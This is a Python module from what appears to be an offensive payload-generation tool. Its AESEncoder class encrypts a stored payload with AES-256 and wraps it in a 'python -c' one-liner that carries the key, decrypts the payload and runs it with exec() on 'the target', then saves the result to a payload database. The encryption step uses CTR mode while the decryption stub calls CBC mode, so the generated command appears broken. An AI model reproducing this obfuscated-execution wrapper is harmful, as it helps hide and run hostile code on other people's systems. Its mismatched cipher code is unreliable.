import base64
import binascii

from lib.database import insert_payload
from lib.settings import (
    UnacceptableExecType,
    close
)

try:
    from Crypto import Random
    from Crypto.Cipher import AES
    from Crypto.Util import Counter
except:
    print("you need to install PyCrypto in order to use AES encoding `pip install pycrypto`")
    close()


class AESEncoder(object):

    payload_starts = {
        "python": (
            "python -c 'import base64;"
            "from Crypto import Random;from Crypto.Cipher import AES;from Crypto.Util import Counter;"
            "ct=base64.b64decode(\"{}\");dk=base64.b64decode(\"{}\");iv=base64.b64decode(\"{}\");"
            "ivi=int(iv.encode(\"hex\"),16);co=Counter.new(AES.block_size*8,initial_value=ivi);"
            "a=AES.new(dk,AES.MODE_CBC,counter=co);r=a.decrypt(ct);exec(str(r))'"
        )
    }
    acceptable_exec_types = ("python",)

    def __init__(self, payload_data, cursor):
        self.payload = payload_data["data"]["payload"]
        self.exec_type = payload_data["data"]["information"]["exec"]
        self.payload_type = payload_data["data"]["information"]["type"]
        self.cursor = cursor
        self.key_bytes = 32

    def encode(self):
        if self.exec_type.lower() in self.acceptable_exec_types:
            if self.exec_type == "python":
                print("be sure that the target has PyCrypto on their system!")
            payload = self.payload_starts[self.exec_type]
            iv = Random.new().read(AES.block_size)
            iv_int = int(binascii.hexlify(iv), 16)
            ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
            key = Random.new().read(self.key_bytes)
            aes = AES.new(key, AES.MODE_CTR, counter=ctr)
            encoded_payload = base64.b64encode(aes.encrypt(self.payload))
        else:
            payload = ""
        if payload == "":
            raise UnacceptableExecType("{} cannot be encoded into AES-256".format(self.exec_type))
        retval = payload.format(encoded_payload, base64.b64encode(key), base64.b64encode(iv))
        is_inserted = insert_payload(retval, self.payload_type, self.exec_type, self.cursor)
        return retval, is_inserted


